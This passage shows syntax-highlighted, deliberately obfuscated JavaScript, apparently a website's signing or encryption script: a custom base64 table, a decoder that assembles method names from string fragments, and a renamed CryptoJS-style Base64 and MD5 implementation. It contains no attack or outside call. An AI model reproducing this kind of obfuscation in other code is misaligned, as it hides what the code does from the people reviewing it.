class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">1</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, <span class="number">62</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, <span class="number">63</span>, <span class="number">52</span>, <span class="number">53</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">56</span>, <span class="number">57</span>, <span class="number">58</span>, <span class="number">59</span>, <span class="number">60</span>, <span class="number">61</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">33</span>, <span class="number">34</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">37</span>, <span class="number">38</span>, <span class="number">39</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">42</span>, <span class="number">43</span>, <span class="number">44</span>, <span class="number">45</span>, <span class="number">46</span>, <span class="number">47</span>, <span class="number">48</span>, <span class="number">49</span>, <span class="number">50</span>, <span class="number">51</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>],</span><br><span class="line">        <span class="attr">_baseLink</span>: <span class="string">&quot;120112130113220101010101011201011201121313220101&quot;</span>,</span><br><span class="line">        <span class="attr">_basefunction</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">switch</span> (e = <span class="number">2</span> * e,</span><br><span class="line">            str_1 = <span class="variable language_">this</span>.<span class="property">_baseLink</span>[e],</span><br><span class="line">            str_2 = <span class="variable language_">this</span>.<span class="property">_baseLink</span>[e + <span class="number">1</span>],</span><br><span class="line">            result = <span class="string">&quot;&quot;</span>,</span><br><span class="line">            result = t.<span class="title function_">substring</span>(<span class="number">0</span>, str_2),</span><br><span class="line">            <span class="built_in">parseInt</span>(str_1)) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="attr">_mlq</span>:</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">_base</span> += <span class="variable language_">this</span>.<span class="property">_baseTables</span>[result];</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> _mlq + <span class="attr">_zmmn</span>:</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">_base</span> += <span class="variable language_">this</span>.<span class="property">_baseTable</span>[result];</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="attr">default</span>:</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">_base</span> += result</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> t.<span class="title function_">substring</span>(<span class="variable language_">this</span>.<span class="property">_baseLink</span>[e + <span class="number">1</span>])</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    n.<span class="property">_baseLink</span> = n.<span class="property">_baseLink</span>[_lyydw + _nnuy](<span class="string">&quot;&quot;</span>),</span><br><span class="line">    n.<span class="property">_baseTable</span> = n.<span class="property">_baseTable</span>[_muzz + _jggu](<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = t + r; i &lt; n.<span class="property">_baseLink</span>.<span class="property">length</span> / (_nux + _nuz); i++)</span><br><span class="line">        e = n.<span class="title function_">_basefunction</span>(i, e);</span><br><span class="line">    <span class="keyword">return</span> n.<span class="property">_base</span></span><br><span class="line">&#125;;</span><br><span class="line">!<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    _hqjl = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> e = <span class="string">&quot;rAt&quot;</span></span><br><span class="line">          , t = <span class="string">&quot;rAt&quot;</span></span><br><span class="line">          , r = <span class="string">&quot;gth&quot;</span></span><br><span class="line">          , n = <span class="string">&quot;len&quot;</span></span><br><span class="line">          , i = <span class="string">&quot;str&quot;</span></span><br><span class="line">          , o = <span class="string">&quot;sub&quot;</span></span><br><span class="line">          , a = <span class="string">&quot;str&quot;</span></span><br><span class="line">          , s = <span class="string">&quot;str&quot;</span></span><br><span class="line">          , c = <span class="string">&quot;str&quot;</span></span><br><span class="line">          , l = <span class="string">&quot;sub&quot;</span></span><br><span class="line">          , h = <span class="string">&quot;gth&quot;</span></span><br><span class="line">          , u = <span class="string">&quot;in&quot;</span></span><br><span class="line">          , p = <span class="string">&quot;erse&quot;</span></span><br><span class="line">          , f = <span class="string">&quot;rev&quot;</span></span><br><span class="line">          , d = <span class="string">&quot;lit&quot;</span></span><br><span class="line">          , _ = <span class="string">&quot;sp&quot;</span></span><br><span class="line">          , y = <span class="string">&quot;gth&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> _nus = -<span class="number">705100</span>,</span><br><span class="line">        _cac = <span class="number">705102</span>,</span><br><span class="line">        _lqo = <span class="number">121771</span>,</span><br><span class="line">        _sycv = -<span class="number">447488</span>,</span><br><span class="line">        _ptm = <span class="number">834104</span>,</span><br><span class="line">        _qkta = -<span class="number">834104</span>,</span><br><span class="line">        _csr = <span class="number">671648</span>,</span><br><span class="line">        _kiq = -<span class="number">671646</span>,</span><br><span class="line">        _dwuh = -<span class="number">79794</span>,</span><br><span class="line">        _wrp = <span class="number">518838</span>,</span><br><span class="line">        _thb = <span class="number">716406</span>,</span><br><span class="line">        _qax = -<span class="number">716405</span>,</span><br><span class="line">        _bgi = <span class="number">979402</span>,</span><br><span class="line">        _tts = -<span class="number">979402</span>,</span><br><span class="line">        _vwjb = <span class="number">715885</span>,</span><br><span class="line">        _ebah = <span class="number">607613</span>,</span><br><span class="line">        _hppv = <span class="title class_">Object</span>(),</span><br><span class="line">        <span class="keyword">function</span>(<span class="params">g, v, m</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> k, w, b, S, B, x, C, A = <span class="string">&quot;str&quot;</span>, D = <span class="string">&quot;sub&quot;</span>, R = <span class="string">&quot;cha&quot;</span>, z = <span class="string">&quot;str&quot;</span>, T = <span class="string">&quot;sub&quot;</span>, P = <span class="string">&quot;cha&quot;</span>, F = <span class="string">&quot;sub&quot;</span>, E = <span class="string">&quot;rAt&quot;</span>, K = <span class="string">&quot;cha&quot;</span>, j = <span class="string">&quot;sub&quot;</span>, O = <span class="string">&quot;rAt&quot;</span>, L = <span class="string">&quot;cha&quot;</span>, M = <span class="string">&quot;len&quot;</span>, I = <span class="string">&quot;jo&quot;</span>, H = <span class="string">&quot;len&quot;</span>, X = <span class="string">&quot;str&quot;</span>, q = <span class="string">&quot;sub&quot;</span>, W = <span class="number">774547</span>, J = -<span class="number">774547</span>, N = -<span class="number">493875</span>, Q = <span class="number">493875</span>, V = -<span class="number">121770</span>, U = -<span class="number">742534</span>, G = <span class="number">742535</span>, Y = -<span class="number">439955</span>, $ = <span class="number">439956</span>, Z = <span class="number">784672</span>, ee = -<span class="number">784672</span>, te = <span class="number">447488</span>, re = <span class="number">884634</span>, ne = -<span class="number">884634</span>, ie = <span class="number">79795</span>, oe = -<span class="number">518837</span>, ae = -<span class="number">166886</span>, se = <span class="number">166887</span>, ce = -<span class="number">715883</span>, le = -<span class="number">607612</span>;</span><br><span class="line">            <span class="keyword">if</span> (_hppv[g])</span><br><span class="line">                <span class="keyword">return</span> _hppv[g];</span><br><span class="line">            <span class="keyword">for</span> (k = v + m,</span><br><span class="line">            w = <span class="string">&quot;&quot;</span>,</span><br><span class="line">            b = <span class="string">&quot;&quot;</span>,</span><br><span class="line">            S = g,</span><br><span class="line">            g = g[q + X](le + _ebah, g[H + y] - (ce + _vwjb)),</span><br><span class="line">            g = g[_ + d](<span class="string">&quot;&quot;</span>)[f + p]()[I + u](<span class="string">&quot;&quot;</span>),</span><br><span class="line">            B = g[M + h],</span><br><span class="line">            x = _tts + _bgi; B &gt; x; ++x)</span><br><span class="line">                x % k == k - (se + ae) &amp;&amp; (b = g[l + c](B - x - (_qax + _thb), k),</span><br><span class="line">                b = b[L + O](k - (oe + _wrp)) + b[j + s](ie + _dwuh, k - (_kiq + _csr)) + b[K + E](_qkta + _ptm),</span><br><span class="line">                b = b[F + a](ne + re, v),</span><br><span class="line">                w += b);</span><br><span class="line">            <span class="keyword">return</span> C = B % k,</span><br><span class="line">            C != te + _sycv &amp;&amp; (b = g[o + i](ee + Z, C),</span><br><span class="line">            b[n + r] != $ + Y &amp;&amp; (b = b[P + t](C - (G + U)) + b[T + z](V + _lqo, C - (_cac + _nus)) + b[R + e](Q + N)),</span><br><span class="line">            b = b[D + A](J + W, v),</span><br><span class="line">            w += b),</span><br><span class="line">            _hppv[S] = w,</span><br><span class="line">            w</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;(),</span><br><span class="line">    <span class="variable language_">window</span>[<span class="title function_">_hqjl</span>(<span class="string">&quot;yzunzgd&quot;</span>, <span class="number">4</span>, <span class="number">2</span>)] = process</span><br><span class="line">&#125;(),</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">av_</span> = <span class="string">&quot;v&quot;</span>,</span><br><span class="line"><span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> e = coypJsDk</span><br><span class="line">      , t = e.<span class="property">lib</span>.<span class="property">WordArray</span>;</span><br><span class="line">    e.<span class="property">enc</span>.<span class="property">Base64</span> = &#123;</span><br><span class="line">        <span class="attr">stringify</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> t = e.<span class="property">words</span></span><br><span class="line">              , r = e.<span class="property">sigBytes</span></span><br><span class="line">              , n = <span class="variable language_">this</span>.<span class="property">_map</span>;</span><br><span class="line">            e.<span class="title function_">clamp</span>(),</span><br><span class="line">            e = [];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; r &gt; i; i += <span class="number">3</span>)</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> o = (t[i &gt;&gt;&gt; <span class="number">2</span>] &gt;&gt;&gt; <span class="number">24</span> - <span class="number">8</span> * (i % <span class="number">4</span>) &amp; <span class="number">255</span>) &lt;&lt; <span class="number">16</span> | (t[i + <span class="number">1</span> &gt;&gt;&gt; <span class="number">2</span>] &gt;&gt;&gt; <span class="number">24</span> - <span class="number">8</span> * ((i + <span class="number">1</span>) % <span class="number">4</span>) &amp; <span class="number">255</span>) &lt;&lt; <span class="number">8</span> | t[i + <span class="number">2</span> &gt;&gt;&gt; <span class="number">2</span>] &gt;&gt;&gt; <span class="number">24</span> - <span class="number">8</span> * ((i + <span class="number">2</span>) % <span class="number">4</span>) &amp; <span class="number">255</span>, a = <span class="number">0</span>; <span class="number">4</span> &gt; a &amp;&amp; r &gt; i + <span class="number">.75</span> * a; a++)</span><br><span class="line">                    e.<span class="title function_">push</span>(n.<span class="title function_">charAt</span>(o &gt;&gt;&gt; <span class="number">6</span> * (<span class="number">3</span> - a) &amp; <span class="number">63</span>));</span><br><span class="line">            <span class="keyword">if</span> (t = n.<span class="title function_">charAt</span>(<span class="number">64</span>))</span><br><span class="line">                <span class="keyword">for</span> (; e.<span class="property">length</span> % <span class="number">4</span>; )</span><br><span class="line">                    e.<span class="title function_">push</span>(t);</span><br><span class="line">            <span class="keyword">return</span> e.<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">parse</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> r = e.<span class="property">length</span></span><br><span class="line">              , n = <span class="variable language_">this</span>.<span class="property">_map</span></span><br><span class="line">              , i = n.<span class="title function_">charAt</span>(<span class="number">64</span>);</span><br><span class="line">            i &amp;&amp; (i = e.<span class="title function_">indexOf</span>(i),</span><br><span class="line">            -<span class="number">1</span> != i &amp;&amp; (r = i));</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = [], o = <span class="number">0</span>, a = <span class="number">0</span>; r &gt; a; a++)</span><br><span class="line">                <span class="keyword">if</span> (a % <span class="number">4</span>) &#123;</span><br><span class="line">                    <span class="keyword">var</span> s = n.<span class="title function_">indexOf</span>(e.<span class="title function_">charAt</span>(a - <span class="number">1</span>)) &lt;&lt; <span class="number">2</span> * (a % <span class="number">4</span>)</span><br><span class="line">                      , c = n.<span class="title function_">indexOf</span>(e.<span class="title function_">charAt</span>(a)) &gt;&gt;&gt; <span class="number">6</span> - <span class="number">2</span> * (a % <span class="number">4</span>);</span><br><span class="line">                    i[o &gt;&gt;&gt; <span class="number">2</span>] |= (s | c) &lt;&lt; <span class="number">24</span> - <span class="number">8</span> * (o % <span class="number">4</span>),</span><br><span class="line">                    o++</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">return</span> t.<span class="title function_">create</span>(i, o)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">_map</span>: <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;(),</span><br><span class="line"><span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">t</span>(<span class="params">e, t, r, n, i, o, a</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> e = e + (t &amp; r | ~t &amp; n) + i + a,</span><br><span class="line">        (e &lt;&lt; o | e &gt;&gt;&gt; <span class="number">32</span> - o) + t</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">r</span>(<span class="params">e, t, r, n, i, o, a</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> e = e + (t &amp; n | r &amp; ~n) + i + a,</span><br><span class="line">        (e &lt;&lt; o | e &gt;&gt;&gt; <span class="number">32</span> - o) + t</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">n</span>(<span class="params">e, t, r, n, i, o, a</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> e = e + (t ^ r ^ n) + i + a,</span><br><span class="line">        (e &lt;&lt; o | e &gt;&gt;&gt; <span class="number">32</span> - o) + t</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">i</span>(<span class="params">e, t, r, n, i, o, a</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> e = e + (r ^ (t | ~n)) + i + a,</span><br><span class="line">        (e &lt;&lt; o | e &gt;&gt;&gt; <span class="number">32</span> - o) + t</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> o = coypJsDk, a = o.<span class="property">lib</span>, s = a.<span class="property">WordArray</span>, c = a.<span class="property">Hasher</span>, a = o.<span class="property">algo</span>, l = [], h = <span class="number">0</span>; <span class="number">64</span> &gt; h; h++)</span><br><span class="line">        l[h] = <span class="number">4294967296</span> * e.<span class="title function_">abs</span>(e.<span class="title function_">sin</span>(h + <span class="number">1</span>)) | <span class="number">0</span>;</span><br><span class="line">    a = a.<span class="property">MD5</span> = c.<span class="title function_">extend</span>(&#123;</span><br><span class="line">        <span class="attr">_doReset</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_hash</span> = <span class="keyword">new</span> s.<span class="title function_">init</span>([<span class="number">1732584193</span>, <span class="number">4023233417</span>, <span class="number">2562383102</span>, <span class="number">271733878</span>])</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">_doProcessBlock</span>: <span class="keyword">function</span>(<span class="params">e, o</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> a = <span class="number">0</span>; <span class="number">16</span> &gt; a; a++) &#123;</span><br><span class="line">                <span class="keyword">var</span> s = o + a</span><br><span class="line">                  , c = e[s];</span><br><span class="line">                e[s] = <span class="number">16711935</span> &amp; (c &lt;&lt; <span class="number">8</span> | c &gt;&gt;&gt; <span class="number">24</span>) | <span class="number">4278255360</span> &amp; (c &lt;&lt; <span class="number">24</span> | c &gt;&gt;&gt; <span class="number">8</span>)</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">var</span> a = <span class="variable language_">this</span>.<span class="property">_hash</span>.<span class="property">words</span></span><br><span class="line">              , s = e[o + <span class="number">0</span>]</span><br><span class="line">              , c = e[o + <span class="number">1</span>]</span><br><span class="line">              , h = e[o + <span class="number">2</span>]</span><br><span class="line">              , u = e[o + <span class="number">3</span>]</span><br><span class="line">              , p = e[o + <span class="number">4</span>]</span><br><span class="line">              , f = e[o + <span class="number">5</span>]</span><br><span class="line">              , d = e[o + <span class="number">6</span>]</span><br><span class="line">              , _ = e[o + <span class="number">7</span>]</span><br><span class="line">              , y = e[o + <span class="number">8</span>]</span><br><span class="line">              , g = e[o + <span class="number">9</span>]</span><br><span class="line">              , v = e[o + <span class="number">10</span>]</span><br><span class="line">              , m = e[o + <span class="number">11</span>]</span><br><span class="line">              , k = e[o + <span class="number">12</span>]</span><br><span class="line">              , w = e[o + <span class="number">13</span>]</span><br><span class="line">              , b = e[o + <span class="number">14</span>]</span><br><span class="line">              , S = e[o + <span class="number">15</span>]</span><br><span class="line">              , B = a[<span class="number">0</span>]</span><br><span class="line">              , x = a[<span class="number">1</span>]</span><br><span class="line">              , C = a[<span class="number">2</span>]</span><br><span class="line">              , A = a[<span class="number">3</span>]</span><br><span class="line">              , B = <span class="title function_">t</span>(B, x, C, A, s, <span class="number">7</span>, l[<span class="number">0</span>])</span><br><span class="line">              , A = <span class="title function_">t</span>(A, B, x, C, c, <span class="number">12</span>, l[<span class="number">1</span>])</span><br><span class="line">              , C = <span class="title function_">t</span>(C, A, B, x, h, <span class="number">17</span>, l[<span class="number">2</span>])</span><br><span class="line">              , x = <span class="title function_">t</span>(x, C, A, B, u, <span class="number">22</span>, l[<span class="number">3</span>])</span><br><span class="line">              , B = <span class="title function_">t</span>(B, x, C, A, p, <span class="number">7</span>, l[<span class="number">4</span>])</span><br><span class="line">              , A = <span class="title function_">t</span>(A, B, x, C, f, <span class="number">12</span>, l[<span class="number">5</span>])</span><br><span class="line">              , C = <span class="title function_">t</span>(C, A, B, x, d, <span class="number">17</span>, l[<span class="number">6</span>])</span><br><span class="line">              , x = <span class="title function_">t</span>(x, C, A, B, _, <span class="number">22</span>, l[<span class="number">7</span>])</span><br><span class="line">              , B = <span class="title function_">t</span>(B, x, C, A, y, <span class="number">7</span>, l[<span class="number">8</span>])</span><br><span class="line">              , A = <span class="title function_">t</span>(A, B, x, C, g, <span class="number">12</span>, l[<span class="number">9</span>])</span><br><span class="line">              , C = <span class="title function_">t</span>(C, A, B, x, v, <span class="number">17</span>, l[<span class="number">10</span>])</span><br><span class="line">              , x = <span class="title function_">t</span>(x, C, A, B, m, <span class="number">22</span>, l[<span class="number">11</span>])</span><br><span class="line">              , B = <span class="title function_">t</span>(B, x, C, A, k, <span class="number">7</span>, l[<span class="number">12</span>])</span><br><span class="line">              , A = <span class="title function_">t</span>(A, B, x, C, w, <span class="number">12</span>, l[<span class="number">13</span>])</span><br><span class="line">              , C = <span class="title function_">t</span>(C, A, B, x, b, <span class="number">17</span>, l[<span class="number">14</span>])</span><br><span class="line">              , x = <span class="title function_">t</span>(x, C, A, B, S, <span class="number">22</span>, l[<span class="number">15</span>])</span><br><span class="line">              , B = <span class="title function_">r</span>(B, x, C, A, c, <span class="number">5</span>, l[<span class="number">16</span>])</span><br><span class="line">              , A = <span class="title function_">r</span>(A, B, x, C, d, <span class="number">9</span>, l[<span class="number">17</span>])</span><br><span class="line">              , C = <span class="title function_">r</span>(C, A, B, x, m, <span class="number">14</span>, l[<span class="number">18</span>])</span><br><span class="line">              , x = <span class="title function_">r</span>(x, C, A, B, s, <span class="number">20</span>, l[<span class="number">19</span>])</span><br><span class="line">              , B = <span class="title function_">r</span>(B, x, C, A, f, <span class="number">5</span>, l[<span class="number">20</span>])</span><br><span class="line">              , A = <span class="title function_">r</span>(A, B, x, C, v, <span class="number">9</span>, l[<span class="number">21</span>])</span><br><span class="line">              , C = <span class="title function_">r</span>(C, A, B, x, S, <span class="number">14</span>, l[<span class="number">22</span>])</span><br><span class="line">              , x = <span class="title function_">r</span>(x, C, A, B, p, <span class="number">20</span>, l[<span class="number">23</span>])</span><br><span class="line">              , B = <span class="title function_">r</span>(B, x, C, A, g, <span class="number">5</span>, l[<span class="number">24</span>])</span><br><span class="line">              , A = <span class="title function_">r</span>(A, B, x, C, b, <span class="number">9</span>, l[<span class="number">25</span>])</span><br><span class="line">              , C = <span class="title function_">r</span>(C, A, B, x, u, <span class="number">14</span>, l[<span class="number">26</span>])</span><br><span class="line">              , x = <span class="title function_">r</span>(x, C, A, B, y, <span class="number">20</span>, l[<span class="number">27</span>])</span><br><span class="line">              , B = <span class="title function_">r</span>(B, x, C, A, w, <span class="number">5</span>, l[<span class="number">28</span>])</span><br><span class="line">              , A = <span class="title function_">r</span>(A, B, x, C, h, <span class="number">9</span>, l[<span class="number">29</span>])</span><br><span class="line">              , C = <span class="title function_">r</span>(C, A, B, x, _, <span class="number">14</span>, l[<span class="number">30</span>])</span><br><span class="line">              , x = <span class="title function_">r</span>(x, C, A, B, k, <span class="number">20</span>, l[<span class="number">31</span>])</span><br><span class="line">              , B = <span class="title function_">n</span>(B, x, C, A, f, <span class="number">4</span>, l[<span class="number">32</span>])</span><br><span class="line">              , A = <span class="title function_">n</span>(A, B, x, C, y, <span class="number">11</span>, l[<span class="number">33</span>])</span><br><span class="line">              , C = <span class="title function_">n</span>(C, A, B, x, m, <span class="number">16</span>, l[<span class="number">34</span>])</span><br><span class="line">              , x = <span class="title function_">n</span>(x, C, A, B, b, <span class="number">23</span>, l[<span class="number">35</span>])</span><br><span class="line">              , B = <span class="title function_">n</span>(B, x, C, A, c, <span class="number">4</span>, l[<span class="number">36</span>])</span><br><span class="line">              , A = <span class="title function_">n</span>(A, B, x, C, p, <span class="number">11</span>, l[<span class="number">37</span>])</span><br><span class="line">              , C = <span class="title function_">n</span>(C, A, B, x, _, <span class="number">16</span>, l[<span class="number">38</span>])</span><br><span class="line">              , x = <span class="title function_">n</span>(x, C, A, B, v, <span class="number">23</span>, l[<span class="number">39</span>])</span><br><span class="line">              , B = <span class="title function_">n</span>(B, x, C, A, w, <span class="number">4</span>, l[<span class="number">40</span>])</span><br><span class="line">              , A = <span class="title function_">n</span>(A, B, x, C, s, <span class="number">11</span>, l[<span class="number">41</span>])</span><br><span class="line">              , C = <span class="title function_">n</span>(C, A, B, x, u, <span class="number">16</span>, l[<span class="number">42</span>])</span><br><span class="line">              , x = <span class="title function_">n</span>(x, C, A, B, d, <span class="number">23</span>, l[<span class="number">43</span>])</span><br><span class="line">              , B = <span class="title function_">n</span>(B, x, C, A, g, <span class="number">4</span>, l[<span class="number">44</span>])</span><br><span class="line">              , A = <span class="title function_">n</span>(A, B, x, C, k, <span class="number">11</span>, l[<span class="number">45</span>])</span><br><span class="line">              , C = <span class="title function_">n</span>(C, A, B, x, S, <span class="number">16</span>, l[<span class="number">46</span>])</span><br><span class="line">              , x = <span class="title function_">n</span>(x, C, A, B, h, <span class="number">23</span>, l[<span class="number">47</span>])</span><br><span class="line">              , B = <span class="title function_">i</span>(B, x, C, A, s, <span class="number">6</span>, l[<span class="number">48</span>])</span><br><span class="line">              , A = <span class="title function_">i</span>(A, B, x, C, _, <span class="number">10</span>, l[<span class="number">49</span>])</span><br><span class="line">              , C = <span class="title function_">i</span>(C, A, B, x, b, <span class="number">15</span>, l[<span class="number">50</span>])</span><br><span class="line">              , x = <span class="title function_">i</span>(x, C, A, B, f, <span class="number">21</span>, l[<span class="number">51</span>])</span><br><span class="line">              , B = <span class="title function_">i</span>(B, x, C, A, k, <span class="number">6</span>, l[<span class="number">52</span>])</span><br><span class="line">              , A = <span class="title function_">i</span>(A, B, x, C, u, <span class="number">10</span>, l[<span class="number">53</span>])</span><br><span class="line">              , C = <span class="title function_">i</span>(C, A, B, x, v, <span class="number">15</span>, l[<span class="number">54</span>])</span><br><span class="line">              , x = <span class="title function_">i</span>(x, C, A, B, c, <span class="number">21</span>, l[<span class="number">55</span>])</span><br><span class="line">              , B = <span class="title function_">i</span>(B, x, C, A, y, <span class="number">6</span>, l[<span class="number">56</span>])</span><br><span class="line">              , A = <span class="title function_">i</span>(A, B, x, C, S, <span class="number">10</span>, l[<span class="number">57</span>])</span><br><span class="line">              , C = <span class="title function_">i</span>(C, A, B, x, d, <span class="number">15</span>, l[<span class="number">58</span>])</span><br><span class="line">              , x = <span class="title function_">i</span>(x, C, A, B, w, <span class="number">21</span>, l[<span class="number">59</span>])</span><br><span class="line">              , B = <span class="title function_">i</span>(B, x, C, A, p, <span class="number">6</span>, l[<span class="number">60</span>])</span><br><span class="line">              , A = <span class="title function_">i</span>(A, B, x, C, m, <span class="number">10</span>, l[<span class="number">61</span>])</span><br><span class="line">              , C = <span class="title function_">i</span>(C, A, B, x, h, <span class="number">15</span>, l[<span class="number">62</span>])</span><br><span class="line">              , x = <span class="title function_">i</span>(x, C, A, B, g, <span class="number">21</span>, l[<span class="number">63</span>]);</span><br><span class="line">            a[<span class="number">0</span>] = a[<span class="number">0</span>] + B | <span class="number">0</span>,</span><br><span class="line">            a[<span class="number">1</span>] = a[<span class="number">1</span>] + x | <span class="number">0</span>,</span><br><span class="line">            a[<span class="number">2</span>] = a[<span class="number">2</span>] + C | <span 